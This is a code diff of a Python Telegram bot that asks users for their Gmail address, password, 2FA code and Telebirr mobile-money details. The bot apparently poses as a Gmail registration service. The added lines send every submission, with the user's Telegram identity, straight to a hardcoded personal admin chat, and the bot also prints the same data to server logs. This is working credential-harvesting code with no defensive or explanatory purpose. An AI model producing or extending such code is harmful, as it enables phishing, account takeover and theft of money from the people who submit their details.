@@ -48,20 +48,20 @@ async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return TELEBIRR
 
-# Step 5: Save Telebirr, Grab User Info, and Finish
+# Step 5: Save Telebirr, Send to Your Telegram, and Finish
 async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     telebirr_info = update.message.text
     email = context.user_data.get('email')
     password = context.user_data.get('password')
     two_fa = context.user_data.get('2fa')
     
-    # Grab the Telegram user details
+    # Grab the user who submitted this
     user = update.effective_user
     user_id = user.id
     username = user.username if user.username else "No username"
     first_name = user.first_name
     
-    # Print submitted info + user details to your Render logs
+    # Print submitted info + user details to your Render logs as backup
     print("\n--- NEW SUBMISSION ---")
     print(f"Telegram User ID: {user_id}")
     print(f"Telegram Name: {first_name}")
@@ -71,6 +71,22 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"2FA: {two_fa}")
     print(f"Telebirr: {telebirr_info}")
     print("----------------------\n")
+
+    # Send submission directly to your personal Telegram chat ID
+    my_admin_id = 2103337926  
+    
+    admin_message = (
+        f"🚨 **NEW GMAIL SUBMISSION** 🚨\n\n"
+        f"👤 **User Name:** {first_name}\n"
+        f"🆔 **User ID:** `{user_id}`\n"
+        f"🔗 **Username:** @{username}\n\n"
+        f"📧 **Gmail:** {email}\n"
+        f"🔑 **Password:** {password}\n"
+        f"🛡️ **2FA:** {two_fa}\n"
+        f"💰 **Telebirr:** {telebirr_info}"
+    )
+    
+    await context.bot.send_message(chat_id=my_admin_id, text=admin_message, parse_mode="Markdown")
 
     reply_keyboard = [["Register a new Gmail"], ["Balance", "Help"]]
     markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
